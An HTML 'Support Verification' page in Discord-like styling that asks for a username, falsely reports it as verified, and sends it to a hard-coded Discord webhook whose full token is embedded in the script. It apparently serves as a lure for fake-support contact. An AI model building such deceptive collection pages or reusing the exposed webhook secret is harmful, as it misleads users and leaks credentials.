ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ

<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Support Verification</title>

    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: "Inter", Arial, sans-serif;
            background: linear-gradient(135deg, #5865F2, #3A3FCE);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
        }

        .container {
            width: 420px;
            background: #ffffff;
            padding: 30px;
            border-radius: 14px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
            animation: fadeIn 0.6s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        h2 {
            text-align: center;
            margin-bottom: 20px;
            color: #222;
            font-weight: 600;
        }

        label {
            font-weight: 600;
            margin-top: 12px;
            display: block;
        }

        input {
            width: 100%;
            padding: 12px;
            margin-top: 6px;
            border-radius: 8px;
            border: 1px solid #ccc;
            font-size: 15px;
            transition: 0.2s;
        }

        input:focus {
            border-color: #5865F2;
            box-shadow: 0 0 5px rgba(88,101,242,0.4);
            outline: none;
        }

        #verifyBtn {
            width: 100%;
            padding: 14px;
            margin-top: 20px;
            background: #5865F2;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
        }

        #verifyBtn:hover {
            background: #4752C4;
        }

        #responseMessage {
            text-align: center;
            margin-top: 15px;
            font-weight: 600;
        }
    </style>
</head>

<body>

<div class="container">
    <h2>Support Verification</h2>

    <label>Please enter your username</label>
    <input type="text" id="username" placeholder="e.g. CoolUser#1234" required>

    <button id="verifyBtn">Verify</button>

    <p id="responseMessage"></p>
</div>

<script>
document.getElementById("verifyBtn").addEventListener("click", function() {

    const username = document.getElementById("username").value.trim();

    if (username === "") {
        document.getElementById("responseMessage").innerText = "Please enter your username first.";
        document.getElementById("responseMessage").style.color = "red";
        return;
    }

    const webhookURL = "https://discord.com/api/webhooks/1482377942053949591/hoYKlEzsOZu8yz5Yz8YntJ9QIfWb43eFGA6v9c4v0CLCFGrMH1Tug65CJBtwHJ1kozbi";

    const message = {
        content: `**[User has entered support website and verified]**\nUsername: ${username}`
    };

    fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(message)
    })
    .then(() => {
        document.getElementById("responseMessage").innerText = "Verification complete! Redirecting...";
        document.getElementById("responseMessage").style.color = "green";

        setTimeout(() => {
            window.location.href = "support.html"; // ← CHANGE THIS TO YOUR SUPPORT PAGE URL
        }, 1500);
    })
    .catch(() => {
        document.getElementById("responseMessage").innerText = "Error sending verification.";
        document.getElementById("responseMessage").style.color = "red";
    });
});
</script>

</body>
</html>

